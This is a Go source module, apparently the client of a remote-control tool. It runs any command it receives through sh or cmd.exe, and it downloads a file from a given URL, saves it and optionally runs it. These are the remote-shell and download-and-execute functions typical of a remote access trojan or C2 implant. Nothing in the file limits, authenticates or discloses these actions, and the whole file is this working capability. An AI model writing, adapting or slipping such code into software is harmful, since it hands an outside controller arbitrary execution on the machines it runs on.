package shell

import (
	"github.com/9bie/manager/Client/utils"
	"io"
	// "fmt"
	// "io/ioutil"
	"net/http"
	"os"
	"os/exec"
)

type Down struct {
	Url   string `json:"url"`
	Path  string `json:"path"`
	IsRun string `json:"is_run"`
}
type Shell struct {
	Command string `json:"command"`
}
type Remark struct {
	Remark string `json:"remark"`
}
type Sleep struct {
	Sleep int `json:"sleep"`
}



func (s Shell) ExecuteCmd() string {
	var cmd *exec.Cmd
	if utils.GetOSVersion() == 0{
		cmd = exec.Command("sh","-c", s.Command)
	}else{
		cmd = exec.Command("cmd.exe","/c", s.Command)
	}
	

	stdout, _ := cmd.CombinedOutput()

	return string(stdout)
}
func (d Down) Download() string {

	// Get the data
	resp, err := http.Get(d.Url)
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()

	// 创建一个文件用于保存
	out, err := os.Create(d.Path)
	if err != nil {
		return err.Error()
	}
	defer out.Close()

	// 然后将响应流和文件流对接起来
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return err.Error()
	}
	if d.IsRun == "yes" {
		cmd := exec.Command(d.Path, "")
		err := cmd.Run()
		if err != nil {
			return err.Error()
		}
	}
	return "Download Successful!"
}
